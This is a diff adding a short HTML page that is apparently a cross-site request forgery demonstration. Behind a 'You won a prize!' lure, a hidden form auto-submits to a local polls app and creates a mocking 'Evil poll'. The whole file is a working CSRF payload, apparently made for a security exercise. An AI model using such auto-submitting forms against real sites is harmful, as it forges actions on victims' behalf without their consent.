@@ -1,0 +1,18 @@
+<html>
+  <body>
+    <h2>Dear Sir,</h2>
+    Congratulations! You won a prize!
+
+    <form id="csrf-form" action="http://localhost:8000/polls/save-poll/" method="POST">
+      <input type="hidden" name="question" value="Evil poll">
+      <input type="hidden" name="choice1" value="Your code is buggy">
+      <input type="hidden" name="choice2" value="Your tests fail">
+      <input type="hidden" name="choice3" value="Your code is spaghetti">
+      <input type="hidden" name="choice4" value="">
+    </form>
+
+    <script>
+      document.getElementById("csrf-form").submit();
+    </script>
+  </body>
+</html>
